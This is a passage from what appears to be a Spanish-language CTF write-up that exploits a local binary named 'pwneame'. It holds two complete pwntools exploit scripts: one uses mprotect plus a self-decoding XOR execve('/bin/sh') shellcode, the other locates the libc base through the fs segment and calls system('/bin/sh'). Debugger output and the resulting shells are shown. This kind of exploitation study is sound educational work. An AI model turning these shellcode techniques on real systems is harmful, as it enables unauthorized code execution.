+</span><span class="az">0x00000000cafe001b</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> vmmap 0xcafe0000
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> | </span><span class="ro">WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="ro">►       0xcafe0000         0xcafe1000 rwxp     1000      0 [anon_cafe] +0x0</span><span class="p">
+    0x63e80d1b6000     0x63e80d1b7000 r--p     1000      0 /home/user/pwneame  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit final inicia ejecutando <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los permisos a <code class="language-plaintext highlighter-rouge">rwx</code> y luego ya ejecuta el decoder que anteriormente vimos como funciona, una vez que se restauramos el shellcode original con <code class="language-plaintext highlighter-rouge">execve</code> lo ejecuta y nos otorga la shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, context, asm, xor
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./pwneame"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x3b"</span><span class="p">)</span><span class="c1">                 # execve() NR</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rax"</span><span class="p">)</span><span class="c1">                   # $rax = execve()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, 0x68732f6e69622f"</span><span class="p">)</span><span class="c1"> # $rdi = "/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdi"</span><span class="p">)</span><span class="c1">                  # $rsp = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rsp"</span><span class="p">)</span><span class="c1">                  # &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdi"</span><span class="p">)</span><span class="c1">                   # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"cdq"</span><span class="p">)</span><span class="c1">                       # $rdx = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdx"</span><span class="p">)</span><span class="c1">                  # $rsp = &0x0</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                   # $rdi = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"syscall"</span><span class="p">)</span><span class="c1">                   # system call execve()</span><span class="p">
+
+shellcode</span><span class="o"> =</span><span class="p"> xor(shellcode, </span><span class="mi">0x1</span><span class="p">)
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea rax, [rcx - 0xb]"</span><span class="p">)</span><span class="c1">        # $rax = mprotect()</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor rdi, rdi"</span><span class="p">)</span><span class="c1">                # $rdi = 0x0</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov edi, 0xcafeffff"</span><span class="p">)</span><span class="c1">         # $rdi = 0xcafeffff</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"inc di"</span><span class="p">)</span><span class="c1">                      # $rdi = 0xcafe0000</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x10"</span><span class="p">)</span><span class="c1">                   # $rsp = &0x10</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                     # $rsi = 0x10</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"shl rsi, 0x8"</span><span class="p">)</span><span class="c1">                # $rsi = 0x1000</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x7"</span><span class="p">)</span><span class="c1">                    # $rsp = &0x7</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdx"</span><span class="p">)</span><span class="c1">                     # $rdx = 0x7</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call rax"</span><span class="p">)</span><span class="c1">                    # call mprotect()</span><span class="p">
+
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x15"</span><span class="p">)</span><span class="c1">                   # $rsp = len(shellcode)</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rcx"</span><span class="p">)</span><span class="c1">                     # $rcx = counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add edi, 0x23"</span><span class="p">)</span><span class="c1">               # $rdi = shellcode start</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x17"</span><span class="p">)</span><span class="c1">                  # jump xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode</span><span class="c1">                          # save xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor byte ptr [rdi], 0x1"</span><span class="p">)</span><span class="c1">     # restore xored byte</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"dec cl"</span><span class="p">)</span><span class="c1">                      # decrease counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"inc edi"</span><span class="p">)</span><span class="c1">                     # increase address</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jrcxz $-0x1c"</span><span class="p">)</span><span class="c1">                # if $rcx == 0 -> exec shellcode</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $-0x9"</span><span class="p">)</span><span class="c1">                   # if $rcx != 0 -> loop to decode</span><span class="p">  
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './pwneame': pid 65488  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation2">
+<br><h3 class="post-title">Explotación 2</h3><br>
+
+<p class="plain-text">Otra forma interesante ya que nos otorgan el archivo <code class="language-plaintext highlighter-rouge">libc.so.6</code> es obtener la dirección base de libc, esto lo hacemos accediendo a la estructura <code class="language-plaintext highlighter-rouge">TCB</code> en el segmento <code class="language-plaintext highlighter-rouge">fs</code> en el offset <code class="language-plaintext highlighter-rouge">0x0</code>, guardamos en <code class="language-plaintext highlighter-rouge">rax</code> el qword que se encuentra en el offset <code class="language-plaintext highlighter-rouge">0xb20</code> de la dirección obtenida, este offset contiene la dirección base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./pwneame"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"int3"</span><span class="p">)</span><span class="c1">                   # breakpoint</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, fs:[0x0]"</span><span class="p">)</span><span class="c1">      # $rax = fs segment  </span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, [rax + 0xb20]"</span><span class="p">)</span><span class="c1"> # $rax = libc base</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Llegamos al breakpoint establecido con <code class="language-plaintext highlighter-rouge">int3</code> y podemos ver nuestras 2 instrucciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.  
+</span><span class="az">0x00000000cafe0001 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/3i $rip-1
+   </span><span class="az">0xcafe0000</span><span class="p">:</span><span class="ve">	int3</span><span class="p">
+=> </span><span class="az">0xcafe0001</span><span class="p">:</span><span class="ve">	mov</span><span class="ro">    rax</span><span class="p">,QWORD PTR </span><span class="ro">fs</span><span class="p">:0x0
+   </span><span class="az">0xcafe000a</span><span class="p">:</span><span class="ve">	mov</span><span class="ro">    rax</span><span class="p">,QWORD PTR [</span><span class="ro">rax</span><span class="p">+</span><span class="az">0xb20</span><span class="p">]
+</span><span class="ro">pwndbg></span><span class="p"> ni
+</span><span class="az">0x00000000cafe000a </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> ni
+</span><span class="az">0x00000000cafe0011</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar ambas podemos ver que el contenido de <code class="language-plaintext highlighter-rouge">rax</code> es la dirección base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> p/x $rax
+</span><span class="az">$1</span><span class="p"> = 0x7eee83a00000
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x5679204b4000     0x5679204b8000 rw-p     4000   3000 /home/user/pwneame</span><span class="p">
+</span><span class="p">►   0x7eee83a00000     0x7eee83a28000 r--p    28000      0 /home/user/libc.so.6</span><span class="p">
+</span><span class="ro">►   0x7eee83a28000     0x7eee83bbd000 r-xp   195000  28000 /home/user/libc.so.6</span><span class="p">
+</span><span class="p">►   0x7eee83bbd000     0x7eee83c15000 r--p    58000 1bd000 /home/user/libc.so.6</span><span class="p">
+</span><span class="p">►   0x7eee83c15000     0x7eee83c19000 r--p     4000 214000 /home/user/libc.so.6</span><span class="p">
+</span><span class="sa">►   0x7eee83c19000     0x7eee83c1b000 rw-p     2000 218000 /home/user/libc.so.6</span><span class="p">
+</span><span class="p">    0x7eee83c1b000     0x7eee83c71000 r--p     2000      0 /home/user/ld-linux-x86-64.so.2  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con esto solo nos queda sumar los offsets para la función <code class="language-plaintext highlighter-rouge">system</code> y la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> y hacer la llamada a la función calculada para asi obtener una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ libcdb</span><span class="p"> file libc.so.6
+[</span><span class="az">*</span><span class="p">] </span><span class="ro">libc.so.6</span><span class="p">
+    </span><span class="ve">Version:</span><span class="p">     2.35
+    </span><span class="ve">BuildID:</span><span class="p">     203de0ae33b53fee1578b117cb4123e85d0534f0
+    </span><span class="ve">MD5:</span><span class="p">         a1aab220521fd980ab1467698349d259
+    </span><span class="ve">SHA1:</span><span class="p">        d70dd881e95e9e71ccfac941db27122a415f5086
+    </span><span class="ve">SHA256:</span><span class="p">      cf04db546ffc02cda97831d1711215015dc76927c415e59cbfcc1929ff1b00c4  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x29d90
+                         dup2 = 0x114e20
+                       printf = 0x606f0
+                         puts = 0x80e50
+                         read = 0x1145e0
+                   str_bin_sh = 0x1d8678
+                       system = 0x50d70
+                        write = 0x114680</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, obtenemos la dirección libc base en <code class="language-plaintext highlighter-rouge">rax</code> y la copiamos en <code class="language-plaintext highlighter-rouge">rdi</code>, a <code class="language-plaintext highlighter-rouge">rdi</code> le sumamos el offset de <code class="language-plaintext highlighter-rouge">/bin/sh</code> y a <code class="language-plaintext highlighter-rouge">rax</code> el de de <code class="language-plaintext highlighter-rouge">system</code> que luego llamaremos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./pwneame"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, fs:[0x0]"</span><span class="p">)</span><span class="c1">      # $rax = fs segment</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, [rax + 0xb20]"</span><span class="p">)</span><span class="c1"> # $rax = libc base</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, rax"</span><span class="p">)</span><span class="c1">           # $rdi = libc base</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add rdi, 0x1d8678"</span><span class="p">)</span><span class="c1">      # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add rax, 0x50d70"</span><span class="p">)</span><span class="c1">       # $rax = system()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call rax"</span><span class="p">)</span><span class="c1">               # system("/bin/sh")</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez ejecutamos el exploit podemos ver que se corrompe al ejecutar un <code class="language-plaintext highlighter-rouge">movaps</code>, esto se debe a que las funciones de libc en <code class="language-plaintext highlighter-rouge">x64</code> requieren que la pila este alineada en <code class="language-plaintext highlighter-rouge">16</code> bytes, osea que la direccion de <code class="language-plaintext highlighter-rouge">rsp</code> termine en <code class="language-plaintext highlighter-rouge">0</code> que en este caso no es asi</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x00007eedc9050973 </span><span class="p">in </span><span class="am">__sigemptyset </span><span class="p">(</span><span class="az">set</span><span class="p">=&ltoptimized out>)
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=> </span><span class="az">0x7eedc9050973</span><span class="p"> &lt</span><span class="am">do_system</span><span class="p">+115>:</span><span class="ve">	movaps</span><span class="p"> XMMWORD PTR [</span><span class="ro">rsp</span><span class="p">],</span><span class="ro">xmm1</span><span class="p">  
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rsp
+</span><span class="az">$1</span><span class="p"> = 0x7ffc85cd8818
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este problema lo solucionamos alineando un stack al ejecutar un <code class="language-plaintext highlighter-rouge">add rsp, 8</code> antes de la llamada, entonces nuestro exploit calcula la dirección de libc base y al sumar los offsets podemos ejecutar un <code class="language-plaintext highlighter-rouge">system("/bin/sh");</code> que nos devuelve una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./pwneame"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, fs:[0x0]"</span><span class="p">)</span><span class="c1">      # $rax = fs segment</span><span class="p">  
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rax, [rax + 0xb20]"</span><span class="p">)</span><span class="c1"> # $rax = libc base</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, rax"</span><span class="p">)</span><span class="c1">           # $rdi = libc base</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add rdi, 0x1d8678"</span><span class="p">)</span><span class="c1">      # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add rax, 0x50d70"</span><span class="p">)</span><span class="c1">       # $rax = system()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add rsp, 0x8"</span><span class="p">)</span><span class="c1">           # align stack</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call rax"</span><span class="p">)</span><span class="c1">               # system("/bin/sh")</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit2.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './pwneame': pid 73280  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+y>
+</html>
